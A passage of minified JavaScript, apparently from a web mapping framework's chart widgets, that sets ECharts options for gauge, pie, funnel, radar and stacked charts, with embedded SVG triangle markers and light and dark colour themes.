9*d,-15];return a},_handleValue:function(a,d){var h;h=d.series[0].data[0]<=d.max?d.series[0].data[0]:d.max;a.tooltip.formatter=function(a){return b.handleToolTip(a,d.series[0].data[0],!1)};a.series[1].data[0].value=h;return a},_settingCurvedGauge:function(a,d){a.series=g.clone(this.curvedGaugeSeries);d.min="undefined"!==typeof d.min&&d.min?d.min:0;d.max="undefined"!==typeof d.max&&d.max?d.max:100;a.series[0].min=d.min;a.series[0].max=d.max;a.tooltip.formatter=function(a){return b.handleToolTip(a,
null,!1)};a.series[0].axisLine.lineStyle.color[0][0]=parseFloat(d.series[0].data[0]/d.max).toFixed(2);a.series[0].data[0].value=d.series[0].data[0];d.labels&&d.labels[0]&&(a.series[0].data[0].name=d.labels[0]);d.series[0].name&&(a.series[0].name=d.series[0].name);a.series[0].axisLine.lineStyle.width=30;return a=this._settingCurvedGaugeColor(a,d)},_settingGaugeSeries:function(a,b){if("gauge"!==b.type)return a;"horizontal"===b.shape?a=this._settingHorizontalGauge(a,b):"vertical"===b.shape?a=this._settingVerticalGauge(a,
b):"curved"===b.shape&&(a=this._settingCurvedGauge(a,b));a=this._settingGaugeLabel(a,b);a=this._settingLabelColor(a,b);return a=this._settingValueStyle(a,b)},_resetGraphic:function(a){a=this._settingGraphic(a);this._clearGraphic();this.chart.setOption({graphic:a});this.cacheGraphic=null;this.cacheGraphic=a},_clearGraphic:function(){this.cacheGraphic&&(this.cacheGraphic.forEach(function(a){a.$action="remove"}),this.chart.setOption({graphic:this.cacheGraphic}))},_resetGrid:function(a){a=this._settingGridLeftOfVerticalGauge(a);
n.isNotEmptyObject(a)&&this.chart.setOption({grid:a})},_settingGridLeftOfVerticalGauge:function(a){return"gauge"!==a.type||"vertical"!==a.shape?{}:{left:this._getGridLeftOfVerticalGauge(),width:60,top:"10%",bottom:"10%"}},_settingCurvedGaugeColor:function(a,b){b.gaugeOption&&(b.gaugeOption.bgColor&&(a.series[0].axisLine.lineStyle.color[1][1]=b.gaugeOption.bgColor),b.gaugeOption.columnColor&&(a.series[0].axisLine.lineStyle.color[0][1]=b.gaugeOption.columnColor));return a},_settingNoCurvedGaugeColor:function(a,
b){b.gaugeOption&&(b.gaugeOption.bgColor&&(a.series[0].itemStyle.normal.color=b.gaugeOption.bgColor),b.gaugeOption.columnColor&&(a.series[1].data[0].itemStyle.normal.color=b.gaugeOption.columnColor));return a},_settingGraphic:function(a){var b=[];"gauge"===a.type&&a.gaugeOption&&("horizontal"===a.shape?b=this._settingHorizontalGraphic(a):"vertical"===a.shape&&(b=this._settingVerticalGraphic(a)));return b},_settingHorizontalGraphic:function(a){var b="#000";a.gaugeOption&&a.gaugeOption.labelColor&&
(b=a.gaugeOption.labelColor);var h=[],k=this.chart.convertToPixel({yAxisIndex:0},0),k=parseInt(k,10),k=Number(k)+16;this.cacheCriticalValues=g.clone(this.criticalValues);this.cacheCriticalValues.forEach(g.hitch(this,function(d){var c,e;"object"===typeof d?d.type&&(c=d.type,e=d.value):e=d;d=a.min||0;if(!(e>(a.max||100)||e<d)){d=this._getxAxisValueLeft(e);var g=6*(e.toString().length-2),m=d;0<g&&(m=d-g);c||h.push({z:10,type:"image",$action:"merge",id:"wab_gid_image-"+n.getRandomString(),left:d,style:{image:"data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxzdmcgd2lkdGg9IjdweCIgaGVpZ2h0PSI1cHgiIHZpZXdCb3g9IjAgMCA3IDUiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+DQogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA0NC4xICg0MTQ1NSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+DQogICAgPHRpdGxlPlRyaWFuZ2xlPC90aXRsZT4NCiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4NCiAgICA8ZGVmcz48L2RlZnM+DQogICAgPGcgaWQ9IkxheW91dC0yTmV3IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4NCiAgICAgICAgPGcgaWQ9IkNhcmRXaWRnZXRfTGF5b3V0NCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTg3NS4wMDAwMDAsIC0yOTcuMDAwMDAwKSIgZmlsbD0iIzkzOTM5MyI+DQogICAgICAgICAgICA8ZyBpZD0iQ2FyZDJfSG9yaXpvbnRhbEdhdWdlIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg3OTIuMDAwMDAwLCAxODEuMDAwMDAwKSI+DQogICAgICAgICAgICAgICAgPGcgaWQ9Ikhvcml6b250YWxHYXVnZSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMC4wMDAwMDAsIDY2LjAwMDAwMCkiPg0KICAgICAgICAgICAgICAgICAgICA8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMjguNTAwMDAwLCA0Mi41MDAwMDApIHJvdGF0ZSgtMjcwLjAwMDAwMCkgdHJhbnNsYXRlKC0xMjguNTAwMDAwLCAtNDIuNTAwMDAwKSB0cmFuc2xhdGUoODYuMDAwMDAwLCAtODYuMDAwMDAwKSIgaWQ9Ik51bWJlcnMrVHJpYW5nbGVzIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDUwLjAwMDAwMCwgMC4wMDAwMDApIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cG9seWdvbiBpZD0iVHJpYW5nbGUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDIuNTAwMDAwLCAxNzAuNTQzODAzKSByb3RhdGUoLTE4MC4wMDAwMDApIHRyYW5zbGF0ZSgtMi41MDAwMDAsIC0xNzAuNTQzODAzKSAiIHBvaW50cz0iNSAxNzAuNTQzODAzIC0xLjcwNTMwMjU3ZS0xMyAxNzQuMDQzODAzIC0xLjY5NjQyMDc4ZS0xMyAxNjcuMDQzODAzIj48L3BvbHlnb24+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2c+DQogICAgICAgICAgICAgICAgICAgIDwvZz4NCiAgICAgICAgICAgICAgICA8L2c+DQogICAgICAgICAgICA8L2c+DQogICAgICAgIDwvZz4NCiAgICA8L2c+DQo8L3N2Zz4\x3d",
width:10,height:10},silent:!0,top:k});h.push({z:10,type:"text",$action:"merge",id:"wab_gid_text-"+n.getRandomString(),left:m,style:{text:e,fill:b,font:"normal 11px sans-serif"},silent:!0,top:k+11})}}));return h},_settingVerticalGraphic:function(a){var b="#000";a.gaugeOption&&a.gaugeOption.labelColor&&(b=a.gaugeOption.labelColor);var h=[],k=this.chart.convertToPixel({xAxisIndex:0},0),k=parseFloat(k,10).toFixed(2),k=Number(k),m="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxzdmcgd2lkdGg9IjVweCIgaGVpZ2h0PSI4cHgiIHZpZXdCb3g9IjAgMCA1IDgiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+DQogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA0NC4xICg0MTQ1NSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+DQogICAgPHRpdGxlPlRyaWFuZ2xlPC90aXRsZT4NCiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4NCiAgICA8ZGVmcz48L2RlZnM+DQogICAgPGcgaWQ9IkxheW91dC0yTmV3IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4NCiAgICAgICAgPGcgaWQ9IkNhcmRXaWRnZXRfTGF5b3V0NCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTg3Ni4wMDAwMDAsIC0zMjQuMDAwMDAwKSIgZmlsbD0iIzkzOTM5MyI+DQogICAgICAgICAgICA8ZyBpZD0iQ2FyZDJfSG9yaXpvbnRhbEdhdWdlIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg3OTIuMDAwMDAwLCAxODEuMDAwMDAwKSI+DQogICAgICAgICAgICAgICAgPGcgaWQ9Ikhvcml6b250YWxHYXVnZSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMC4wMDAwMDAsIDY2LjAwMDAwMCkiPg0KICAgICAgICAgICAgICAgICAgICA8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMjguNTAwMDAwLCA0Mi41MDAwMDApIHJvdGF0ZSgtMjcwLjAwMDAwMCkgdHJhbnNsYXRlKC0xMjguNTAwMDAwLCAtNDIuNTAwMDAwKSB0cmFuc2xhdGUoODYuMDAwMDAwLCAtODYuMDAwMDAwKSIgaWQ9Ik51bWJlcnMrVHJpYW5nbGVzIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDUwLjAwMDAwMCwgMC4wMDAwMDApIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cG9seWdvbiBpZD0iVHJpYW5nbGUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDMwLjYyODk1MiwgMTcwLjQ1ODY1NCkgcm90YXRlKC05MC4wMDAwMDApIHRyYW5zbGF0ZSgtMzAuNjI4OTUyLCAtMTcwLjQ1ODY1NCkgIiBwb2ludHM9IjMzLjEyODk1MjMgMTcwLjQ1ODY1NCAyOC4xMjg5NTIzIDE3My45NTg2NTQgMjguMTI4OTUyMyAxNjYuOTU4NjU0Ij48L3BvbHlnb24+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2c+DQogICAgICAgICAgICAgICAgICAgIDwvZz4NCiAgICAgICAgICAgICAgICA8L2c+DQogICAgICAgICAgICA8L2c+DQogICAgICAgIDwvZz4NCiAgICA8L2c+DQo8L3N2Zz4\x3d";
window.isRTL&&(k+=40,m="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxzdmcgd2lkdGg9IjVweCIgaGVpZ2h0PSI3cHgiIHZpZXdCb3g9IjAgMCA1IDciIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+DQogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA0NC4xICg0MTQ1NSkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+DQogICAgPHRpdGxlPlRyaWFuZ2xlPC90aXRsZT4NCiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4NCiAgICA8ZGVmcz48L2RlZnM+DQogICAgPGcgaWQ9IkxheW91dC0yTmV3IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4NCiAgICAgICAgPGcgaWQ9IkFydGJvYXJkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTIxLjAwMDAwMCwgLTQ0Ny4wMDAwMDApIiBmaWxsPSIjOTM5MzkzIj4NCiAgICAgICAgICAgIDxwb2x5Z29uIGlkPSJUcmlhbmdsZSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTIzLjUwMDAwMCwgNDUwLjUwMDAwMCkgcm90YXRlKC0xODAuMDAwMDAwKSB0cmFuc2xhdGUoLTEyMy41MDAwMDAsIC00NTAuNTAwMDAwKSAiIHBvaW50cz0iMTI2IDQ1MC41IDEyMSA0NTQgMTIxIDQ0NyI+PC9wb2x5Z29uPg0KICAgICAgICA8L2c+DQogICAgPC9nPg0KPC9zdmc+");
var c=k-26;this.cacheCriticalValues=g.clone(this.criticalValues);this.cacheCriticalValues.forEach(g.hitch(this,function(d){var e,g;"object"===typeof d?d.type&&(e=d.type,g=d.value):g=d;d=c;d=window.isRTL?c+11:c-11-6*(g.toString().length-1);var k=a.min||0;g>(a.max||100)||g<k||(k=this._getyAxisValueTop(g),k-=2,e||h.push({z:10,type:"image",$action:"merge",id:"wab_gid_image-"+n.getRandomString(),left:c,style:{image:m,width:10,height:10},silent:!0,top:k}),h.push({z:10,type:"text",$action:"merge",id:"wab_gid_text-"+
n.getRandomString(),left:d,style:{text:g,fill:b,font:"normal 11px sans-serif"},silent:!0,top:k-2}))}));return h},_getGridLeftOfVerticalGauge:function(){return this.chart.getWidth()/2-30},_getxAxisValueLeft:function(a){a=this.chart.convertToPixel({xAxisIndex:0},a);return parseFloat(a,10)-4},_getyAxisValueTop:function(a){a=this.chart.convertToPixel({yAxisIndex:0},a);return parseFloat(a,10)},_showSpecialLabel:function(a,b,h){var d=((b.max||100)-(b.min||0))/1E3;h.sort(function(a,b){return a-b});var g=
function(a){var b;h.forEach(function(c){"undefined"===typeof b&&c>=a&&c<a+d&&(b=c)});return b};"curved"===b.shape?a.series[0].axisLabel.formatter=g:"horizontal"===b.shape?a.xAxis.axisLabel.formatter=g:"vertical"===b.shape&&(a.yAxis.axisLabel.formatter=g);return a},_settingGaugeLabel:function(a,b){var d=b.min||0,k=b.max||100,m=[];b.gaugeOption&&b.gaugeOption.showTargetValueLabel&&("curved"===b.shape&&(a.series[0].splitNumber=1E3,a.series[0].axisTick.splitNumber=1,a.series[0].axisTick.show=!1),b.gaugeOption.targetValue&&
b.gaugeOption.targetValue.forEach(function(a){m.push(a)}));this.criticalValues=g.clone(m);b.gaugeOption&&b.gaugeOption.showDataRangeLabel&&(0>m.indexOf(d)&&(m.push(d),this.criticalValues.push({type:"min",value:d})),0>m.indexOf(k)&&(m.push(k),this.criticalValues.push({type:"max",value:k})));return"curved"===b.shape?this._showSpecialLabel(a,b,m):a}})})},"jimu/dijit/_ChartOptionFactory":function(){define(["dojo/_base/declare","dojo/_base/lang","./_chartUtils"],function(q,g,n){return q([],{constructor:function(b){this.chart=
b.chart;this.gauge=b.gauge},produceOption:function(b){this.chart._theme||(this.chart._theme={});b=g.clone(b);b=this._mockChartDataWhenNoData(b);var a={},a=this._settingDefaultGrid(a,b),a=this._settingRenderOption(a,b),a=this._settingBackgroundColor(a,b),a=this._settingColor(a,b),a=this._settingToolTip(a,b),a=this._settingAxisChartAxis(a,b),a=this._settingRadar(a,b),a=this._settingSeries(a,b),a=this._settingStack(a,b),a=this._settingArea(a,b),a=this._settingAxisDisplay(a,b),a=this._settingLegend(a,
b),a=this._settingScale(a,b),a=this._handleChartRtl(a,b),a=this._pieChartAvoidLegendLabelOverLap(a,b),a=this.settingDataZoom(a,b),a=this._settingGrid(a,b),a=this._settingAdvanceOption(a,b);return a=this._avoidAdjoiningColorSameForPie(a,b)},_mockChartDataWhenNoData:function(b){b&&Array.isArray(b.labels)&&0===b.labels.length&&b.labels.push(0);b&&Array.isArray(b.series)&&0<b.series.length&&b.series.forEach(function(a){a&&Array.isArray(a.data)&&0===a.data.length&&a.data.push(0)});return b},_settingAdvanceOption:function(b,
a){a.advanceOption&&("object"===typeof a.advanceOption?g.mixin(b,a.advanceOption):"function"===typeof a.advanceOption&&a.advanceOption(b));return b},_avoidAdjoiningColorSameForPie:function(b,a){if("pie"!==a.type||!b.color||2>=b.color.length)return b;b.series&&b.series[0]&&b.series.forEach(g.hitch(this,function(a){var d=a.data.length;0===(d-1)%b.color.length&&(a=a.data[d-1],a.itemStyle||(a.itemStyle={}),a.itemStyle.normal||(a.itemStyle.normal={}),a.itemStyle.normal.color||(a.itemStyle.normal.color=
b.color[1]))}));return b},_settingDefaultGrid:function(b,a){n.isAxisChart(a)&&(b.grid={top:20,bottom:10,left:10,right:10,containLabel:!0});return b},_settingRenderOption:function(b,a){if("curved"===a.shape)return b.animationThreshold=99999999,b.hoverLayerThreshold=99999,b.progressiveThreshold=99999,b;b.hoverLayerThreshold=500;b.progressiveThreshold=500;b.progressive=100;b.animationThreshold=500;return b},_settingBackgroundColor:function(b,a){a.backgroundColor&&(b.backgroundColor=a.backgroundColor);
return b},_settingColor:function(b,a){a.color&&a.color[0]&&(this.chart._theme||(this.chart._theme={}),this.chart._theme.color=a.color,b.color=a.color);return b},_settingToolTip:function(b,a){b.tooltip={};a.confine&&(b.tooltip.confine=!0);if("radar"===a.type)return b.tooltip.trigger="item",b;if(a.axisPointer){if(b.tooltip.trigger="axis","column"===a.type||"bar"===a.type)b.tooltip.axisPointer={type:"shadow"}}else b.tooltip.axisPointer={type:""};this.chart._theme.tooltip||(this.chart._theme.tooltip=
{});var d=!1;"percent"===a.stack&&(d=!0);this.chart._theme.tooltip.formatter=function(a){return n.handleToolTip(a,null,!1,d)}.bind(this);return b},_settingAxisChartAxis:function(b,a){if(!n.isAxisChart(a))return b;b.xAxis={};b.yAxis={};"column"===a.type||"line"===a.type&&a.labels?(b.xAxis.data=a.labels,b.xAxis.type="category",b.yAxis.type="value"):"bar"===a.type&&a.labels&&(b.yAxis.data=a.labels,b.yAxis.type="category",b.xAxis.type="value");return b},_settingSeries:function(b,a){if("gauge"===a.type)return this.gauge._settingGaugeSeries(b,
a);var d=null,h=a.series;h.forEach(function(b){b.type||(b.type=a.type);b.type="column"===a.type?"bar":a.type});h.keek?d=h:(d=[],d=h.map(g.hitch(this,function(b){b.data=b.data.map(g.hitch(this,function(b,c){var d=null;if("funnel"===a.type||"gauge"===a.type||"pie"===a.type)d={},b||"number"===typeof b?(d.value=b.value?b.value:b,b.itemStyle&&(d.itemStyle||(d.itemStyle={}),d.itemStyle=g.mixin(d.itemStyle,b.itemStyle))):d.value=b,d.name=a.labels[c]||"";else if("column"===a.type||"bar"===a.type||"line"===
a.type){if(!b)return b;d=b}this._showBarBorderColor=d&&d.itemStyle&&d.itemStyle.normal&&"undefined"!==typeof d.itemStyle.normal.color&&"line"!==a.type?a.stack?"stack":"single":!1;return d}));b=this._settingPieSerie(b,a);b=this._settingFunnelSerie(b,a);return b=this._settingRaderSerie(b,a)})));b.series=d;return b=this._handleChartBorderWidthColor(b,a)},_settingRaderSerie:function(b,a){if("radar"!==b.type)return b;var d=a.indicator.map(function(a){return a.name});b.tooltip={};b.tooltip.formatter=function(a){return n.handleToolTip(a,
null,!1,!1,d)};return b},_settingFunnelSerie:function(b,a){if("funnel"!==b.type)return b;b.minSize="0%";b.maxSize="100%";b.sort="descending";b.min=a.min||0;b.max=a.max||100;b.max=a.funnelSort||"descending";return b},_settingPieSerie:function(b,a){if("pie"!==b.type)return b;b.selectedMode="single";b.selectedOffset=10;b.hoverOffset=5;b.radius=[0,"70%"];b.labelLine={normal:{show:!0,length:5,length2:5}};b.labelLine.normal.show="undefined"===typeof a.labelLine?!0:a.labelLine;"number"===typeof a.innerRadius&&
(0>a.innerRadius&&(a.innerRadius=0),60<a.innerRadius&&(a.innerRadius=60),b.radius[0]=a.innerRadius+"%");"rose"===a.pieMode&&(b.roseType=a.roseType||"radius");return b=this._absoluteValueForPieChart(b)},_absoluteValueForPieChart:function(b){if(!b||!b.data||!b.data[0])return b;b.data=b.data.map(function(a){"number"===typeof a?a=Math.abs(a):"object"===typeof a&&"number"===typeof a.value&&(a.value=Math.abs(a.value));return a});return b},_settingRadar:function(b,a){if("radar"!==a.type)return b;b.radar=
{nameGap:6,radius:"70%"};b.radar.axisLabel={show:!0,formatter:function(){}};a.radarShape&&(b.radar.shape=a.radarShape);a.indicator?(this._handleRadarIndicator(a),b.radar.indicator=a.indicator):console.error("No radar indicator");return b},_handleRadarIndicator:function(b){var a=b.series[0].data,d=[];b.indicator.forEach(function(b,g){if("undefined"!==typeof b.max)return b;d=a.map(function(a){d.push(a.value[g])});var h=Math.max.apply(Math,d);b.max=h})},_settingStack:function(b,a){if(!n.isAxisChart(a))return b;
a=this._stackForPercent(a);if("percent"===a.stack){var d=a.series.some(function(a){return a.data.some(function(a){a=a&&a.value?a.value:a;return"number"===typeof a&&0>a})}),g=a.series.every(function(a){return a.data.every(function(a){a=a&&a.value?a.value:a;return"number"===typeof a&&0>a})}),k=0,m=1;d&&(k=-1,g&&(m=0),"bar"===a.type?(b.xAxis.max=m,b.xAxis.min=k):(b.yAxis.max=m,b.yAxis.min=k))}a.stack&&(b.series=b.series.map(function(a){a.stack="stack";return a}));return b},_settingArea:function(b,a){if("line"!==
a.type||!a.area)return b;b.series=b.series.map(function(a){a.areaStyle||(a.areaStyle={});"undefined"===typeof a.areaStyle.opacity&&(a.areaStyle.opacity=.4);a.sthisoth=!0;a.smoothMonotone="x";return a});return b},_stackForPercent:function(b){if("percent"!==b.stack)return b;var a=[];b.series.forEach(function(b){g.clone(b.data).forEach(function(b,c){a[c]||(a[c]=[]);(b=b&&"undefined"!==typeof b.value?b.value:b)||(b=0);a[c].push(b)})});var d=[];a.forEach(function(a,b){d[b]||(d[b]=0);a.forEach(function(a){d[b]+=
Math.abs(a)})});var h=a.map(function(a,b){return a.map(function(a){return 0===d[b]?null:0<=a?Math.abs(a)/d[b]:-Math.abs(a)/d[b]})});b.series=b.series.map(function(a,b){var c=g.clone(a.data),c=c.map(function(a,c){if(!a)return a;"undefined"!==typeof a.value?a.value=h[c][b]:a=h[c][b];return a});a.data=c;return a});return b},_settingAxisDisplay:function(b,a){if(!n.isAxisChart(a))return b;b.xAxis.show=!a.hidexAxis;b.yAxis.show=!a.hideyAxis;b.grid.containLabel=!a.hideyAxis;return b},_settingLegend:function(b,
a){if(!a.legend)return b.legend={show:!1},b;b.legend={show:!0,type:"scroll",orient:"horizontal",x:"left",pageButtonPosition:"end",pageTextStyle:{color:"#939393"},bottom:20,y:"bottom",data:[]};n.isAxisChart(a)||"gauge"===a.type?b.series.forEach(function(a){b.legend.data.push(a.name)}):"pie"!==a.type&&"funnel"!==a.type&&"radar"!==a.type||b.series[0].data.forEach(function(a){b.legend.data.push(a.name)});return b=this._handleLegendRTL(b,a)},_handleLegendRTL:function(b,a){if(!a.legend)return b;a={};window.isRTL?
(a.x="right",a.pageButtonPosition="start"):(a.x="left",a.pageButtonPosition="end");b.legend=g.mixin(b.legend,a);return b},_settingScale:function(b,a){if(!a.scale)return b;"bar"===a.type?b.xAxis.scale=!0:"line"===a.type||"column"===a.type?b.yAxis.scale=!0:"radar"===a.type&&(b.radar.scale=!0);return b},_handleChartRtl:function(b,a){if(!window.isRTL)return b;if(n.isAxisChart(a)||"vertical"===a.shape||"horizontal"===a.shape)b.xAxis.inverse=!0,b.yAxis.position="right";return b},_pieChartAvoidLegendLabelOverLap:function(b,
a){if("pie"!==a.type)return b;var d=a.labelLine?.75:.85;a.legend&&(d-=.12);b.series[0].radius[1]=100*d+"%";return b},settingDataZoom:function(b,a){if(!n.isAxisChart(a)||!a.series||0===a.series.length)return b;if(a.dataZoom&&0<a.dataZoom.length){var d=this.chart.getWidth(),h=10,k=a.series[0].data.length,m=a.series.length,c=k*m;a.stack&&(c=k);5<=m&&(h=17);k=n.getAxisZeroPosition.call(this,a);d="bar"!==a.type?window.isRTL?k.left:d-k.left-b.grid.right:k.top;this.showDataZoom=d/c<h;var e=d/(c*h),e=parseFloat(100*
e,10).toFixed(3),e=100<e?100:e,e=0===e?.01:e,d=[],l="bar"===a.type?"xAxis":"yAxis",y="bar"===a.type?"yAxisIndex":"xAxisIndex",v="bar"===a.type?"width":"height";b=this._initAxisOfDataZoom(b,l);d=a.dataZoom.map(g.hitch(this,function(b){b={type:b,start:0,show:this.showDataZoom};b[y]=[0];b[v]=15;b.end=e;"xAxis"===l&&window.isRTL&&(b.left="10");return b=this._handleDataZoomPosition(a,b)}));b.dataZoom=d}else this.showDataZoom=!1,b.dataZoom=[];return b},_initAxisOfDataZoom:function(b,a){b[a].type="value";
b.xAxis.splitLine={show:!0,lineStyle:{type:"dashed"}};b.yAxis.splitLine={show:!0,lineStyle:{type:"dashed"}};return b},_handleDataZoomPosition:function(b,a){a.showDataShadow=!1;a.realtime=!1;a.bottom=b.legend?30:20;"bar"===b.type&&b.legend&&(a.bottom=50);return a},_settingGrid:function(b,a){if(!n.isAxisChart(a))return b;b.grid&&(b.grid.top=10);var d=10,g=43;a.hideyAxis&&(d=20,g=63);var k=0,m=10;a.legend&&(k=this.showDataZoom?10:20,m+=20);"line"===a.type&&a.legend&&!this.showDataZoom&&(d+=7);"bar"===
a.type?(window.isRTL?b.grid.left=this.showDataZoom?30:10:b.grid.right=this.showDataZoom?30:10,a.hideyAxis&&a.legend&&(m+=20),b.grid.bottom=m):b.grid.bottom=this.showDataZoom?g+k:d+k;return b},_handleChartBorderWidthColor:function(b,a){var d=0;"single"===this._showBarBorderColor?d=.1:"stack"===this._showBarBorderColor&&(d=1);var g="";"stack"===this._showBarBorderColor&&(g="#fff",a.backgroundColor&&"transparent"!==a.backgroundColor&&(g=a.backgroundColor));b.series=b.series.map(function(a){if("bar"===
a.type||"pie"===a.type)a.itemStyle||(a.itemStyle={}),a.itemStyle.normal||(a.itemStyle.normal={}),a.itemStyle.emphasis||(a.itemStyle.emphasis={}),a.itemStyle.normal.borderWidth=d,a.itemStyle.emphasis.borderWidth=d,g?(a.itemStyle.normal.borderColor=g,a.itemStyle.emphasis.borderColor=g):(a.itemStyle.normal.borderColor="transparent",a.itemStyle.emphasis.borderColor="transparent");return a});return b}})})},"libs/echarts/light":function(){(function(q,g){"function"===typeof define&&define.amd?define(["exports",
"./echarts"],g):"object"===typeof exports&&"string"!==typeof exports.nodeName?g(exports,require("./echarts")):g({},q.echarts)})(this,function(q,g){g?g.registerTheme("light",{color:"#2ec7c9 #b6a2de #5ab1ef #ffb980 #d87a80 #8d98b3 #e5cf0d #97b552 #95706d #dc69aa #07a2a4 #9a7fd1 #588dd5 #f5994e #c05050 #59678c #c9ab00 #7eb00a #6f5553 #c14089".split(" "),textStyle:{},title:{textStyle:{color:"#008acd"},subtextStyle:{color:"#aaaaaa"}},line:{itemStyle:{normal:{}},lineStyle:{normal:{width:"1"}},symbolSize:"5",
symbol:"circle",smooth:!1},radar:{itemStyle:{normal:{}},lineStyle:{normal:{width:"1"}},symbolSize:"6",symbol:"circle",smooth:!1},gauge:{axisLine:{lineStyle:{color:[[.31,"#58f7f3"],[1,"#E5E5E5"]]}},itemStyle:{normal:{color:"#686868"},emphasis:{color:"#686868"}}},categoryAxis:{axisLine:{show:!0,lineStyle:{color:"#008acd"}},axisTick:{show:!1,lineStyle:{color:"#333"}},axisLabel:{show:!0,textStyle:{color:"#333"}},splitLine:{show:!0,lineStyle:{type:"dashed",color:["rgba(0,0,0,0.1)"]}},splitArea:{show:!1,
areaStyle:{color:["rgba(250,250,250,0.3)","rgba(200,200,200,0.3)"]}}},valueAxis:{axisLine:{show:!0,lineStyle:{color:"#008acd"}},axisTick:{show:!1,lineStyle:{color:"#333"}},axisLabel:{show:!0,textStyle:{color:"#333"}},splitLine:{show:!0,lineStyle:{type:"dashed",color:["rgba(0,0,0,0.1)"]}},splitArea:{show:!1,areaStyle:{color:["rgba(250,250,250,0.3)","rgba(200,200,200,0.3)"]}}},toolbox:{iconStyle:{normal:{borderColor:"#2ec7c9"},emphasis:{borderColor:"#18a4a6"}}},legend:{textStyle:{color:"#333333"}},
tooltip:{axisPointer:{lineStyle:{color:"#008acd",width:"1"},crossStyle:{color:"#008acd",width:"1"}}},dataZoom:{backgroundColor:"#F4F4F4",dataBackgroundColor:"rgba(47,69,84,0.3)",fillerColor:"#E0E0E0",handleColor:"#777777",handleSize:"100%",borderColor:"#F4F4F4",textStyle:{color:"#939393"}}}):"undefined"!==typeof console&&console&&console.error&&console.error("ECharts is not Loaded")})},"libs/echarts/dark":function(){(function(q,g){"function"===typeof define&&define.amd?define(["exports","./echarts"],
g):"object"===typeof exports&&"string"!==typeof exports.nodeName?g(exports,require("./echarts")):g({},q.echarts)})(this,function(q,g){g?g.registerTheme("dark",{color:"#fc97af #87f7cf #f7f494 #72ccff #f7c5a0 #d4a4eb #d2f5a6 #76f2f2".split(" "),textStyle:{},title:{textStyle:{color:"#ffffff"},subtextStyle:{color:"#dddddd"}},line:{itemStyle:{normal:{}},lineStyle:{normal:{width:"1"}},symbolSize:"5",symbol:"circle",smooth:!1},radar:{itemStyle:{normal:{}},lineStyle:{normal:{width:"1"}},symbolSize:"5",symbol:"circle",
smooth:!1},gauge:{axisLine:{lineStyle:{color:[[.31,"#58f7f3"],[1,"#1E5F6F"]]}},itemStyle:{normal:{color:"#D9D9D9"},emphasis:{color:"#D9D9D9"}}},categoryAxis:{axisLine:{show:!0,lineStyle:{color:"#333"}},axisTick:{show:!1,lineStyle:{color:"#333"}},axisLabel:{show:!0,textStyle:{color:"#939393"}},splitLine:{show:!0,lineStyle:{type:"dashed",color:["rgba(255,255,255,0.1)"]}},splitArea:{show:!1,areaStyle:{color:["rgba(250,250,250,0.3)","rgba(200,200,200,0.3)"]}}},valueAxis:{axisLine:{show:!0,lineStyle:{color:"#333"}},
